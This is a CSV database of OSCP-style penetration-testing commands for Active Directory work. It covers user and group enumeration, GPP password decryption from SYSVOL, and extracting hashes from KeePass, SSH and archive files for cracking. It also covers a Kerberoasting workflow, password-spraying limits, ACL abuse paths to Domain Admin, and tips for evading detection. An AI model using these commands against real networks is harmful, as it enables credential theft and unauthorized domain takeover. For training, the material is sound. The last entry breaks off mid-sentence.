"gpp-password-decrypt","Decrypt GPP Password","enumeration","gpp-decrypt ""<CPASSWORD>""","Decrypt AES-encrypted Group Policy Preference passwords found in SYSVOL using published Microsoft AES key","","GPP (Group Policy Preferences) passwords were stored AES-256 encrypted in SYSVOL.

Microsoft published the AES key on MSDN (MS14-025), allowing anyone to decrypt.

Common locations:
Groups.xml (local admin password), ScheduledTasks.xml (scheduled task credentials), Services.xml (service account passwords).

SYSVOL is domain-wide readable - all users can access.

Search pattern:
findstr /S /I cpassword \\<DC>\SYSVOL\<DOMAIN>\Policies\*.xml.

Microsoft patched the ability to SET new GPP passwords (2014) but old passwords remain.

OSCP:
Still found in legacy labs - always check SYSVOL.","high"
"powerview-find-domainshare-exclude","Find Domain Shares (Exclude Defaults)","enumeration","Find-DomainShare -CheckShareAccess -ExcludeStandard","Enumerate accessible SMB shares excluding default shares (ADMIN$, C$, IPC$)","","Focus on non-standard shares.

Common finds:
SYSVOL (GPP passwords), NETLOGON (login scripts), Users (SSH keys, .rdp files), IT (tools/scripts).","high"
"psloggedon","Enumerate Logged-On Users (PsLoggedOn)","enumeration","PsLoggedOn.exe \\<COMPUTER>","Display locally and remotely logged-on users using Sysinternals PsLoggedOn","","Alternative to Get-NetLoggedon when PowerView not available.

Works even when NetSessionEnum API is restricted.

Requires Remote Registry service enabled (disabled by default on Server 2019+/Windows 11+).","medium"
"gpp-password-files","Find GPP Password Files in SYSVOL","enumeration","findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml","Search SYSVOL for Group Policy Preference files containing encrypted passwords","","CRITICAL OSCP technique.

Common files:
Groups.xml (local admin password), ScheduledTasks.xml (task credentials), Services.xml (service accounts).

All authenticated users can read SYSVOL.","high"
"keepass2john-extract","Extract KeePass Database Hash","enumeration","keepass2john <KEEPASS_DB> > <OUTPUT_FILE>","Convert KeePass database to John/Hashcat compatible hash format","","OSCP TIP:
KeePass databases found in:
~/Documents, Desktop, network shares, Downloads.

Search:
find / -name '*.kdbx' 2>/dev/null.

After extraction, REMOVE 'Database:' prefix for Hashcat (keep for John).

Hash format:
$keepass$*2*60*0*hash_data.

The *2* indicates KeePass 2.x, *60* is transform rounds (in thousands).","high"
"ssh2john-extract","Extract SSH Private Key Hash","enumeration","ssh2john <PRIVATE_KEY> > <OUTPUT_FILE>","Convert SSH private key to John/Hashcat compatible hash format","","OSCP TIP:
SSH keys found in:
~/.ssh/id_rsa, /root/.ssh/id_rsa, web server file disclosure, backup files.

Search:
find / -name id_rsa 2>/dev/null.

After extraction, check hash for cipher:
$sshng$X$ where X=cipher indicator ($6$=aes-256-cbc, etc.).

Modern keys often use aes-256-ctr (John only, NOT Hashcat).

Remove 'id_rsa:' prefix before cracking.","high"
"zip2john-extract","Extract Encrypted ZIP Hash","enumeration","zip2john <ZIP_FILE> > <OUTPUT_FILE>","Convert encrypted ZIP file to crackable hash format","","ZIP files often contain:
backup data, sensitive documents, password lists.

After cracking, extract with:
unzip encrypted.zip (enter cracked password).

Check if ZIP actually requires password:
unzip -l encrypted.zip (if succeeds = no password needed).","medium"
"rar2john-extract","Extract Encrypted RAR Hash","enumeration","rar2john <RAR_FILE> > <OUTPUT_FILE>","Convert encrypted RAR archive to crackable hash format","","RAR5 uses much stronger encryption than RAR3 (similar to bcrypt slowness).

After cracking, extract with:
unrar x encrypted.rar (or 7z x encrypted.rar).","medium"
"office2john-extract","Extract Microsoft Office Document Hash","enumeration","office2john <OFFICE_FILE> > <OUTPUT_FILE>","Convert password-protected Office documents to crackable hash","","Office 2007+ uses AES encryption (slow cracking).

Focus on targeted wordlists.

Common scenario:
password-protected spreadsheets with credentials, macros, sensitive data.","medium"
"hash-identifier","Identify Hash Type","enumeration","hash-identifier","Interactive hash type identifier tool","","OSCP TIP:
Hash identification by characteristics - Length 32 hex:
MD5/MD4/MD2/NTLM, Length 40 hex:
SHA1, Length 64 hex:
SHA256.

Context helps:
Windows = NTLM, Linux /etc/shadow = sha512crypt ($6$), Web apps = MD5/bcrypt.

Cannot always distinguish - may need to try multiple modes.","medium"
"hashid","Hashid - Modern Hash Identifier","enumeration","hashid '<HASH>' -m","Identify hash type with Hashcat/John mode numbers","","OSCP TIP:
Use hashid instead of hash-identifier for modern workflows.

Command-line (scriptable) + shows exact modes for Hashcat/John.

Example:
hashid '$6$rounds=5000$...' -m → identifies sha512crypt with Hashcat mode 1800 and JtR format sha512crypt.

Quote hashes to prevent shell interpretation of special chars ($, !).","high"
"pdf2john-extract","Extract PDF Password Hash","enumeration","pdf2john <PDF_FILE> > <OUTPUT_FILE>","Convert password-protected PDF to crackable hash","","PDFs often contain:
documentation, password lists, network diagrams.

Two password types:
user (viewing) and owner (editing).

May only need user password for access.","low"
"python-hash-generator","Generate Hash for Testing","enumeration","echo -n '<PASSWORD>' | md5sum","Generate MD5 hash for testing/verification","","OSCP TIP:
Verify crack success by regenerating hash.

Example:
Cracked password = 'secret1', verify:
echo -n 'secret1' | sha256sum (compare to original hash).

Use for understanding:
same plaintext → same hash, different plaintext → different hash.

Generate test hashes:
for pw in pass password 123456; do echo -n ""$pw"" | md5sum; done","low"
"base64-decode-hash","Base64 Decode Hash","enumeration","echo '<ENCODED_STRING>' | base64 -d","Decode base64-encoded strings (sometimes contain hashes)","","Base64 is encoding, NOT encryption.

Some applications store passwords/hashes base64-encoded.

Always try decoding suspicious base64 strings.

Encode:
echo -n 'password123' | base64.

Decode:
echo 'cGFzc3dvcmQxMjM=' | base64 -d","low"
"net-user-domain-list","List All Domain Users","enumeration","net user /domain","Enumerate all user accounts in the domain using built-in net.exe","","OSCP TRAINING MATERIAL - DOMAIN USER ENUMERATION WITH NET.EXE:
WHAT IS NET USER /DOMAIN:
Built-in Windows command-line tool for enumerating domain user accounts.

Available on all Windows versions (XP through 11) without requiring PowerShell, RSAT, or administrative privileges.

WHY USE THIS FIRST:
- No installation required:
Works immediately on compromised Windows host
- No special privileges:
Any domain user can enumerate domain accounts
- Fast execution:
Returns results in <5 seconds typically
- Baseline enumeration:
Provides complete user list for further targeting

HOW IT WORKS:
1.

net.exe connects to domain controller via NetAPI32

2.

Queries SAM (Security Accounts Manager) database for user objects

3.

Returns list of sAMAccountName values (usernames)

4.

No additional attributes retrieved (groups, descriptions, etc.)

COMMAND EXECUTION:
```cmd
net user /domain
```

EXPECTED OUTPUT:
```
User accounts for \\DC01.corp.com

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
jeff                     jen                      stephanie
iis_service              sql_service              backup_admin
The command completed successfully.
```

OUTPUT INTERPRETATION:
- Default accounts:
Administrator, Guest, krbtgt (always present)
- Regular users:
jeff, jen, stephanie (human users)
- Service accounts:
iis_service, sql_service (likely have SPNs)
- Admin accounts:
backup_admin (naming pattern suggests elevated privileges)

OSCP METHODOLOGY:
1.

INITIAL ENUMERATION:
Run `net user /domain` immediately after gaining access to domain-joined host.

2.

IDENTIFY HIGH-VALUE TARGETS:
- Admin naming patterns:
*admin*, *adm*, *administrator*
- Service accounts:
*svc*, *service*, *sql*, *iis*, *apache*
- Backup accounts:
*backup*, *bkup* (often have SeBackupPrivilege)

3.

ENUMERATE EACH INTERESTING USER:
```cmd
net user administrator /domain
net user sql_service /domain
net user backup_admin /domain
```

4.

CHECK FOR SPNS (Kerberoasting):
```cmd
setspn -L sql_service
setspn -L iis_service
```

LIMITATIONS:
- Username only:
No group memberships, descriptions, or attributes
- No password information:
Cannot see password ages or policies
- No nested group visibility:
Only direct group memberships later
- Requires domain connectivity:
Must reach domain controller

ALTERNATIVES WHEN NET.EXE BLOCKED:
- PowerShell:
`Get-ADUser -Filter * -Properties samaccountname`
- PowerView:
`Get-NetUser`
- LDAP query:
`ldapsearch` from Kali
- Impacket:
`lookupsid.py` from Kali

COMMON FAILURES:
""System error 1355"" (domain not found):
- Not on domain-joined machine
- Domain controller unreachable
- DNS resolution failure
- Fix:
Verify domain membership with `systeminfo | findstr /B /C:""Domain""`

""Access is denied"":
- Not authenticated as domain user
- Local account trying to query domain
- Fix:
Verify with `whoami /user` - should show domain SID

""The request will be processed at a domain controller"":
- DC processing query (normal message)
- Wait 5-10 seconds for response

MANUAL ALTERNATIVE:
From PowerShell (if net.exe blocked):
```powershell
([adsisearcher]""(&(objectCategory=User)(objectClass=User))"").FindAll() | ForEach-Object { $_.Properties.samaccountname }
```

TIME ESTIMATE:
- Command execution:
<5 seconds
- Manual review of output:
30-60 seconds (identify targets)
- Total:
1-2 minutes

EXAM STRATEGY:
1.

Run IMMEDIATELY upon gaining Windows shell access

2.

Save output to file for reference:
```cmd
net user /domain > users.txt
```

3.

Identify 5-10 high-value targets based on naming

4.

Enumerate each with `net user <USERNAME> /domain`

5.

Focus on service accounts for Kerberoasting

6.

Check admin accounts for weak password patterns

WHY THIS MATTERS:
User enumeration is FIRST STEP in every AD attack chain:
- Kerberoasting:
Need usernames with SPNs
- Password spraying:
Need username list
- Targeted attacks:
Identify high-value accounts
- Privilege escalation:
Find admin accounts

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 3 (Network logon to DC)
- Event ID 4662:
Object access (user object queries)
- Minimal detection:
Standard domain activity
- Stealthy:
No exploitation, just enumeration","high"
"net-user-domain-detail","Get Specific Domain User Details","enumeration","net user <USERNAME> /domain","Retrieve detailed information about a specific domain user including group memberships, password policy, and logon information","","OSCP TRAINING MATERIAL - DETAILED DOMAIN USER ENUMERATION:
WHAT IS NET USER <USERNAME> /DOMAIN:
Retrieves comprehensive information about specific domain user account including group memberships, password policy compliance, account status, and logon history.

Essential for identifying high-value targets and understanding account privileges.

CRITICAL OUTPUT FIELDS:
1.

GLOBAL GROUP MEMBERSHIPS:
```
Global Group memberships     *Domain Users         *Domain Admins
```
- Domain Admins = Full domain control (instant win)
- Enterprise Admins = Forest-wide control
- Account Operators = Can create/modify accounts
- Backup Operators = SeBackupPrivilege (read any file)

2.

LOCAL GROUP MEMBERSHIPS:
```
Local Group Memberships      *Administrators
```
Indicates user is local administrator on THIS computer AND likely local admin on other domain computers.

3.

PASSWORD INFORMATION:
```
Password last set            10/15/2023 9:45:23 AM
Password expires             Never
Password changeable          10/15/2023 9:45:23 AM
Password required            Yes
```
- Old password (>1 year):
May be weaker, set before policy changes
- Never expires:
Service account indicator
- Not required:
Rare but exploitable

4.

ACCOUNT STATUS:
```
Account active               Yes
Account expires              Never
Last logon                   11/8/2025 2:15:45 PM
```
- Last logon recent:
Active user (more detection risk)
- Last logon old (>90 days):
Dormant account (stealthy to compromise)
- Account expires:
Temporary accounts (contractors)

5.

LOGON HOURS:
```
Logon hours allowed          All
```
Restricted hours = Potential detection evasion opportunity.

OSCP ATTACK METHODOLOGY:
STEP 1 - IDENTIFY HIGH-VALUE TARGETS:
From `net user /domain` output, target these patterns:
```cmd
net user administrator /domain
net user sql_service /domain
net user backup_admin /domain
net user svc_apache /domain
```

STEP 2 - CHECK GROUP MEMBERSHIPS:
Look for:
- Domain Admins:
Full domain control
- Enterprise Admins:
Forest control
- Administrators:
Local admin rights
- Server Operators:
Can backup/restore files
- Account Operators:
Can modify user accounts

STEP 3 - ASSESS PASSWORD AGE:
```
Password last set            1/15/2019 9:45:23 AM  # 4+ years old!
```
Older passwords:
- May predate strong password policies
- Common patterns:
Company123!, Password2019
- Good Kerberoasting targets

STEP 4 - CHECK FOR SERVICE ACCOUNTS:
Indicators:
- Password expires:
Never
- Logon hours:
All
- Full Name:
""SQL Service Account"" or similar
- Naming:
svc_*, service_*, sql_*, iis_*

Service accounts:
- Often have SPNs (Kerberoastable)
- Rarely changed passwords
- Elevated privileges (local admin, database access)
- Low detection (service logons normal)

STEP 5 - IDENTIFY DORMANT ACCOUNTS:
```
Last logon                   3/22/2023 8:00:00 AM  # 18+ months ago
```
Dormant accounts:
- Lower detection risk (no one monitoring)
- May still have elevated privileges
- Good for persistence (less likely to be noticed)
- Password rarely changed

COMMAND EXAMPLES:
```cmd
REM Enumerate specific user
net user jen /domain

REM Check if user is Domain Admin
net user administrator /domain | findstr /C:""Domain Admins""

REM Find all Domain Admins (from group enumeration)
net group ""Domain Admins"" /domain
```

OUTPUT INTERPRETATION EXAMPLE:
```
User name                    svc_sql
Full Name                    SQL Server Service Account
Global Group memberships     *Domain Users         *Administrators
Local Group Memberships      *Administrators
Password last set            1/5/2018 10:00:00 AM
Password expires             Never
Last logon                   11/10/2025 3:15:00 AM
```

ANALYSIS:
- Service account (naming, ""never expires"")
- Domain Administrators group (CRITICAL)
- Local admin rights
- Old password (7+ years!)
- Recent logon (service active)
- ACTION:
Kerberoast this account → crack offline → lateral movement

LIMITATIONS:
- Single user only:
Must enumerate each username separately
- No SPN visibility:
Use `setspn -L <USERNAME>` to check
- Last logon accuracy:
May not reflect true last logon (cached value)
- No nested groups:
Only shows direct group memberships

COMPARISON TO POWERVIEW:
net.exe:
- Built-in, no installation
- Single user at a time
- No filtering/search
- Clean readable output

PowerView Get-NetUser:
- Requires PowerShell
- Bulk enumeration with filters
- Extensive attributes
- Scriptable/automated

COMMON FAILURES:
""The user name could not be found"":
- Typo in username
- User doesn't exist in domain
- Fix:
List users first with `net user /domain`

""System error 1355"":
- DC unreachable
- Not domain-joined machine
- Fix:
Verify connectivity with `ping <DC>`

""Access is denied"":
- Not authenticated as domain user
- Fix:
Check authentication with `whoami /user`

MANUAL ALTERNATIVE:
PowerShell ADSI query:
```powershell
$user = [ADSI]""LDAP://CN=jen,CN=Users,DC=corp,DC=com""
$user.Properties
```

TIME ESTIMATE:
- Single user query:
<5 seconds
- Enumerating 10 users:
1-2 minutes
- Analysis per user:
15-30 seconds
- Total for 10 users:
3-5 minutes

EXAM STRATEGY:
1.

Run `net user /domain` to get username list

2.

Enumerate 5-10 HIGH-VALUE users:
- administrator
- Any *admin* accounts
- Any *svc* or *service* accounts
- Domain Admins members (from group enum)

3.

Document findings:
```
svc_sql:
Domain Admins, password 7 years old → KERBEROAST
backup_admin:
Backup Operators, dormant 18 months → TARGET
administrator:
Last logon today → HIGH DETECTION RISK
```

4.

Prioritize targets:
- Domain Admin service accounts → Kerberoast first
- Dormant admin accounts → Password spray
- Recent logon admins → Last resort (detection)

KEY INSIGHT:
Group membership = attack vector:
- Domain Admins → Compromise = game over
- Administrators → Lateral movement to computers
- Backup Operators → SeBackupPrivilege (dump SAM/NTDS)
- Account Operators → Create admin accounts
- Server Operators → Service manipulation

FORENSIC ARTIFACTS:
- Event ID 4624:
Network logon to DC (Type 3)
- Event ID 4662:
AD object access (user object query)
- Minimal footprint:
Standard enumeration
- Stealthy:
No modifications, read-only queries","high"
"net-group-domain-list","List All Domain Groups","enumeration","net group /domain","Enumerate all security groups in the domain","","OSCP METHODOLOGY:
Enumerate all domain groups to identify high-privilege targets.

DEFAULT HIGH-VALUE GROUPS:
- Domain Admins:
Full domain control
- Enterprise Admins:
Forest-wide control
- Administrators:
Local admin on domain computers
- Backup Operators:
SeBackupPrivilege
- Account Operators:
Can create/modify accounts
- Server Operators:
Service management

CUSTOM GROUPS TO TARGET:
Look for naming patterns:
- *Admin*, *IT*, *Service*:
Often have elevated permissions
- *Management*, *Executive*:
May have sensitive data access
- *Development*, *DevOps*:
May have deployment privileges

COMMAND:
  net group /domain

NEXT STEPS:
For each interesting group:
  net group ""<GROUPNAME>"" /domain

Time:
<5 seconds","high"
"net-group-domain-members","List Members of Specific Domain Group","enumeration","net group ""<GROUPNAME>"" /domain","Enumerate all members of a specific domain group to identify high-value targets","","CRITICAL LIMITATION:
net.exe only lists user objects, NOT nested group objects.

NESTED GROUP DETECTION:
If you see a member name but:
  net user <USERNAME> /domain
fails with ""user not found"" → It's a nested group, not a user.

WORKAROUND FOR NESTED GROUPS:
- PowerView:
Get-NetGroupMember -Recurse
- Manual LDAP query from Kali
- Enumerate the nested group:
net group ""<NESTED_GROUP>"" /domain

COMMAND:
  net group ""Domain Admins"" /domain

OSCP PRIORITY:
Domain Admins members = instant win if compromised.
Enumerate each member with net user to find attack vectors.

Time:
<5 seconds per group","high"
"net-accounts-domain","Get Domain Password Policy","enumeration","net accounts /domain","Retrieve domain password policy including minimum length, complexity, lockout threshold, and password age requirements","","CRITICAL FOR PASSWORD ATTACKS:
Understand domain password policy before attempting password spraying or brute force.

KEY FIELDS:
1.

Lockout threshold:
   How many failed attempts before account lockout.
   - 0 = Unlimited attempts (brute force freely)
   - 5 = Limit to 2-3 attempts per account
   - Common values:
3, 5, 10, or 0

2.

Lockout duration:
   How long account stays locked after threshold reached.
   - 30 minutes = Wait or move to different accounts
   - Forever (until admin unlock) = Very dangerous

3.

Minimum password length:
   Shortest password allowed (typically 8-14 characters).

4.

Password complexity:
   Requirements:
uppercase, lowercase, numbers, symbols.

COMMAND:
  net accounts /domain

OSCP STRATEGY:
- Lockout threshold 0:
Spray unlimited passwords per user
- Lockout threshold 3-5:
Maximum 2 passwords per user
- Lockout threshold 10+:
Can try 5-7 passwords safely

Time:
<5 seconds","high"
"setspn-list-user","List SPNs for Specific User","enumeration","setspn -L <USERNAME>","List Service Principal Names (SPNs) associated with a specific user account to identify service accounts and potential Kerberoasting targets","","WHY SERVICE ACCOUNTS MATTER:
- Elevated privileges (local admin, database access)
- Weak passwords (rarely changed)
- Kerberoastable (offline cracking, no lockout)

SPN FORMAT:
ServiceClass/Host:Port/ServiceName

COMMON SERVICE CLASSES:
- HTTP:
Web servers (IIS, Apache)
- MSSQLSvc:
SQL Server
- TERMSRV:
RDP/Terminal Services
- HOST:
Multiple services

COMMAND:
  setspn -L svc_sql

KERBEROASTING WORKFLOW:
1.

Find user with SPN:
setspn -L <USERNAME>

2.

Request service ticket:
Rubeus.exe kerberoast /user:<USERNAME>

3.

Crack offline:
hashcat -m 13100 ticket.txt wordlist.txt

OSCP ADVANTAGE:
Offline attack - no account lockout risk.

Time:
<5 seconds per user","high"
"setspn-query-all","Query All SPNs in Domain","enumeration","setspn -Q */*","Enumerate all Service Principal Names registered in the domain to discover service accounts and services","","WHAT THIS REVEALS:
All registered services with hostnames/ports WITHOUT port scanning.

EXAMPLE OUTPUT:
  MSSQLSvc/DB01.corp.com:1433
  → SQL Server on DB01, port 1433

  HTTP/WEB01.corp.com
  → IIS web server on WEB01

COMMAND:
  setspn -Q */*

HIGH-VALUE SPNS:
- MSSQLSvc:
SQL Server (often elevated privileges)
- HTTP/HTTPS:
IIS web servers
- exchangeMDB:
Exchange servers
- TERMSRV:
RDP services

OSCP WORKFLOW:
1.

Query all SPNs:
setspn -Q */*

2.

Extract usernames from CN= lines

3.

Check each user:
setspn -L <USERNAME>

4.

Kerberoast high-value accounts

Time:
10-30 seconds (depends on domain size)","high"
"dsquery-user","Query Domain Users with dsquery","enumeration","dsquery user","Query Active Directory for user objects using dsquery (built-in AD query tool)","","dsquery is part of Windows Server RSAT and may not be available on all Windows clients.

Returns Distinguished Names (LDAP format) instead of usernames, requiring additional parsing.

For OSCP, net.exe is more reliable as it's installed by default on all Windows versions.

dsquery is useful when you need LDAP-formatted queries or when net.exe is restricted by policy.","medium"
"dsquery-computer","Query Domain Computers with dsquery","enumeration","dsquery computer","Query Active Directory for computer objects to enumerate domain-joined machines","","Reveals all domain-joined computers without network scanning.

Domain Controllers are in 'OU=Domain Controllers', servers/workstations in 'CN=Computers' or custom OUs.

Extract hostname from CN= field.

OSCP:
Less useful than net.exe or PowerView since output requires parsing.

Use when net.exe is restricted or you need to query specific OUs with -startnode flag.","medium"
"dsquery-group","Query Domain Groups with dsquery","enumeration","dsquery group","Query Active Directory for group objects to enumerate security groups","","Returns LDAP distinguished names which require parsing.

net.exe provides cleaner output.

Use dsquery when you need to query specific OUs or when net.exe is restricted.

OSCP:
Stick with net group /domain for exam - faster and cleaner output.","medium"
"net-group-domain-admins","List Domain Admins Group Members","enumeration","net group ""Domain Admins"" /domain","Enumerate members of Domain Admins group using built-in net.exe","","SHORTCUT COMMAND:
Direct query for Domain Admins group members.

WHY THIS MATTERS:
- Domain Admins = Full domain control
- Identify highest-value compromise targets
- Check for service accounts in this group (Kerberoasting gold)

COMMAND:
  net group ""Domain Admins"" /domain

NEXT STEPS:
Enumerate each member:
  net user <MEMBER> /domain

Time:
<5 seconds","high"
"net-group-domain-computers","List Domain Computers Group","enumeration","net group ""Domain Computers"" /domain","Enumerate computer accounts in the domain","","Shows all computer accounts in the domain.

Computer names end with $.","medium"
"net-domain-controllers","Identify Domain Controllers","enumeration","nltest /dclist:<DOMAIN>","List all domain controllers in the domain using nltest","","IDENTIFY DOMAIN CONTROLLERS:
List all DCs in the domain.

WHY TARGET DCs:
- Hold master copy of AD database (NTDS.dit)
- Contain all domain credentials
- DCSync attacks possible if compromised

COMMAND:
  nltest /dclist:corp.com

OUTPUT:
  PDC = Primary Domain Controller
  Lists all DC hostnames and IPs

Time:
<5 seconds","high"
"setspn-list-all","List All SPNs in Domain","enumeration","setspn -T <DOMAIN> -Q */*","Enumerate all Service Principal Names (SPNs) in the domain for Kerberoasting","","ENUMERATE ALL SPNS IN DOMAIN:
Discover Kerberoasting targets domain-wide.

COMMAND:
  setspn -T corp.com -Q */*

WHAT TO LOOK FOR:
- USER accounts with SPNs (Kerberoastable)
- Ignore COMPUTER$ accounts (not crackable)

FOCUS ON:
- MSSQLSvc:
SQL service accounts
- HTTP:
Web service accounts
- Custom services:
Application accounts

KERBEROASTING:
User accounts with SPNs = offline crackable tickets.

Time:
10-30 seconds","high"
"dsquery-users","Query All Domain Users (dsquery)","enumeration","dsquery user","LDAP query for all user objects in the domain using dsquery","","Returns distinguished names (DNs), not usernames.

Pipe to dsget for readable output:
dsquery user | dsget user -samid -desc","medium"
"dsquery-computers","Query All Domain Computers (dsquery)","enumeration","dsquery computer","LDAP query for all computer objects in the domain","","Returns DNs.

Convert to hostnames:
dsquery computer | dsget computer -name","medium"
"dsquery-admins","Query Domain Admins Group (dsquery)","enumeration","dsquery group -name ""Domain Admins"" | dsget group -members","Query Domain Admins group and list all members","","TWO-STAGE QUERY:
1.

dsquery finds group DN

2.

dsget extracts members

COMMAND:
  dsquery group -name ""Domain Admins"" | dsget group -members

REQUIRES:
RSAT tools installed.

ALTERNATIVE:
  net group ""Domain Admins"" /domain
(Simpler, more reliable)

Time:
5-10 seconds","high"
"dsquery-domain-controllers","Query Domain Controllers (dsquery)","enumeration","dsquery server","Query all domain controllers in the forest","","QUERY ALL DOMAIN CONTROLLERS:
COMMAND:
  dsquery server

OUTPUT:
DC distinguished names with site information.

REQUIRES:
RSAT tools installed.

ALTERNATIVE:
  nltest /dclist:<DOMAIN>
(More reliable, built-in)

Time:
<5 seconds","high"
"powerview-get-objectacl","Get Object ACL (PowerView)","enumeration","Get-ObjectAcl -Identity <OBJECT>","Retrieve Access Control List (permissions) for any AD object to identify who has what access","","Returns ACL (Access Control List) - all permissions applied to an object.

EACH ACE (ACCESS CONTROL ENTRY) DEFINES:
1.

SecurityIdentifier:
Who has access (as SID)
2.

ActiveDirectoryRights:
What access they have (GenericAll, WriteDACL, etc.)

OUTPUT ANALYSIS:
Output is verbose - use Convert-SidToName to resolve SIDs.
Filter for dangerous rights.

OSCP PRIVESC:
Look for GenericAll, WriteDACL, WriteOwner on privileged groups/users.","high"
"powerview-get-objectacl-genericall","Find GenericAll Permissions (PowerView)","enumeration","Get-ObjectAcl -Identity ""<OBJECT>"" | ? {$_.ActiveDirectoryRights -eq ""GenericAll""} | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who has GenericAll (full control) permissions on a specific AD object","","GENERICALL = FULL CONTROL

ON USER OBJECTS:
- Reset their password
- Modify attributes
- Read all properties

ON GROUP OBJECTS:
- Add/remove members (add yourself to Domain Admins!)
- Modify group attributes

ON COMPUTER OBJECTS:
- Modify servicePrincipalName (Kerberoasting)
- Access LAPS password

OSCP:
Most powerful ACL for privilege escalation.
If you have GenericAll on privileged group → add yourself to group.","high"
"powerview-convert-sidtoname","Convert SID to Username (PowerView)","enumeration","Convert-SidToName <SID>","Resolve Security Identifier (SID) to human-readable username, group name, or computer name","","SIDs (SECURITY IDENTIFIERS):
Unique identifiers for AD objects.

FORMAT:
S-1-5-21-<domain>-<RID>

COMMON RIDS:
- 500:
Administrator
- 512:
Domain Admins
- 513:
Domain Users

Get-ObjectAcl returns SIDs in SecurityIdentifier field.
Must convert to names for analysis.

BATCH CONVERSION:
  Get-ObjectAcl | select -ExpandProperty SecurityIdentifier | Convert-SidToName

ALTERNATIVE:
  [system.security.principal.securityidentifier]::new('<sid>').translate([system.security.principal.ntaccount]).value

OSCP:
SIDs are useless until converted to names.","high"
"powerview-get-objectacl-writedacl","Find WriteDACL Permissions (PowerView)","enumeration","Get-ObjectAcl -Identity ""<OBJECT>"" | ? {$_.ActiveDirectoryRights -match ""WriteDacl""} | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who can modify ACLs (permissions) on an AD object - allows granting yourself GenericAll","","WRITEDACL = MODIFY ACL PERMISSIONS

ATTACK PATH:
1.

You have WriteDACL on target object
2.

Grant yourself GenericAll on that object
3.

Now you have full control

EXAMPLE:
WriteDACL on 'Domain Admins' → Grant GenericAll → Add yourself to Domain Admins

SIMILAR POWERFUL RIGHTS:
- WriteOwner:
Change owner, then modify ACL
- WriteProperty:
Modify attributes

OSCP:
WriteDACL is as powerful as GenericAll - just requires one extra step.","high"
"powerview-get-objectacl-forcechangepassword","Find ForceChangePassword Rights (PowerView)","enumeration","Get-ObjectAcl -Identity ""<USERNAME>"" -ResolveGUIDs | ? {$_.ObjectAceType -eq ""User-Force-Change-Password""} | select SecurityIdentifier,ObjectAceType","Enumerate who can reset passwords for a specific user without knowing the current password","","USER-FORCE-CHANGE-PASSWORD:
Can reset user's password without knowing current password.

ATTACK PATH:
1.

You have ForceChangePassword on target user
2.

Reset their password
3.

Authenticate as them

NO CURRENT PASSWORD NEEDED.
NO ACCOUNT LOCKOUT.

SIMILAR RIGHTS:
AllExtendedRights (includes password reset + other extended rights)

PROTECTED ACCOUNTS:
admincount=1 may have this right restricted by AdminSDHolder.

OSCP:
If you can reset Domain Admin password → domain compromised.","high"
"powerview-get-objectacl-writeowner","Find WriteOwner Permissions (PowerView)","enumeration","Get-ObjectAcl -Identity ""<OBJECT>"" | ? {$_.ActiveDirectoryRights -match ""WriteOwner""} | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who can change ownership of an AD object - allows granting yourself full permissions","","WRITEOWNER = CHANGE OBJECT OWNER
Object owners have implicit rights to modify the object's ACL.

ATTACK PATH:
1.

You have WriteOwner on target object
2.

Change owner to yourself:
Set-DomainObjectOwner
3.

As owner, grant yourself GenericAll
4.

Abuse full control (add to group, reset password, etc.)

COMPARISON:
Similar to WriteDACL but requires two steps instead of one.

OSCP:
WriteOwner on privileged group = privilege escalation path.","high"
"powerview-find-interestingdomainacl","Find Interesting ACL Misconfigurations (PowerView)","enumeration","Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match ""<USERNAME>""}","Automatically discover ACL misconfigurations where specified user has dangerous permissions on other objects","","AUTOMATED ACL ENUMERATION:
Scans entire domain for dangerous permissions.

RETURNS INTERESTING RIGHTS:
- GenericAll
- WriteDACL
- WriteOwner
- ForceChangePassword

KEY FIELDS:
- IdentityReferenceName:
Who has the permission (filter for your user)
- ObjectDN:
What object they have permission on (look for privileged groups/users)

PERFORMANCE:
Slow in large domains - consider manual enumeration of specific high-value targets.

OSCP:
Run this early to identify all potential privilege escalation paths via ACL abuse.","high"
"powerview-get-pathacl","Get Share Path ACL (PowerView)","enumeration","Get-PathAcl -Path ""\\<TARGET>\<SHARE>""","Enumerate file share permissions to identify accessible or misconfigured shares","","NTFS PERMISSIONS ON NETWORK SHARES

FILESYSTEMRIGHTS:
- FullControl:
read/write/delete
- Modify:
read/write
- ReadAndExecute:
read/execute

IDENTITYREFERENCE:
Shows who has access (users/groups).

COMMON MISCONFIGURATION:
Everyone or Authenticated Users with Modify/FullControl on sensitive shares.

SYSVOL SHARE:
Domain-wide readable.
May contain GPP passwords (cpassword attribute).

OSCP:
Check all discovered shares for misconfigurations and sensitive data.","medium"
"powerview-get-objectacl-user","Get User Object ACL (PowerView)","enumeration","Get-ObjectAcl -Identity ""<USERNAME>"" | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who has permissions on a specific user account","","IDENTIFIES WHO CAN MODIFY USER ACCOUNT

LOOK FOR:
- GenericAll:
Full control
- WriteDACL:
Can change permissions
- ForceChangePassword:
Can reset password","high"
"powerview-get-objectacl-group","Get Group Object ACL (PowerView)","enumeration","Get-ObjectAcl -Identity ""<GROUPNAME>"" | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who has permissions on a specific group (e.g., Domain Admins)","","CRITICAL FOR PRIVILEGE ESCALATION

GenericAll on Domain Admins = you can add yourself to the group.

COMMON MISCONFIGURATION:
Check this early in enumeration.","high"
"powerview-get-netcomputer-os","Enumerate Computer Operating Systems (PowerView)","enumeration","Get-NetComputer -FullData | Select-Object dnshostname, operatingsystem, operatingsystemversion","Query Active Directory for all domain computers with OS version information to identify legacy systems vulnerable to session enumeration attacks","","CRITICAL FOR SESSION ENUMERATION STRATEGY:
Identify systems vulnerable to NetSessionEnum attacks.

BUILD NUMBER HISTORY:
Windows 10:
- 1507 (10240):
Vulnerable
- 1511 (10586):
Vulnerable
- 1607 (14393):
Vulnerable
- 1703 (15063):
Vulnerable
- 1709 (16299):
RESTRICTED - only admins can query sessions

Windows Server:
- 2012 R2 (9600):
Vulnerable
- 2016 (14393):
Vulnerable
- 2019 (17763/1809):
RESTRICTED

TARGET BUILD NUMBERS:
- Workstations:
<16299 (pre-1709)
- Servers:
<17763 (pre-2019)

COMMAND:
  Get-NetComputer -FullData | Select-Object dnshostname, operatingsystem, operatingsystemversion

WHY THIS MATTERS:
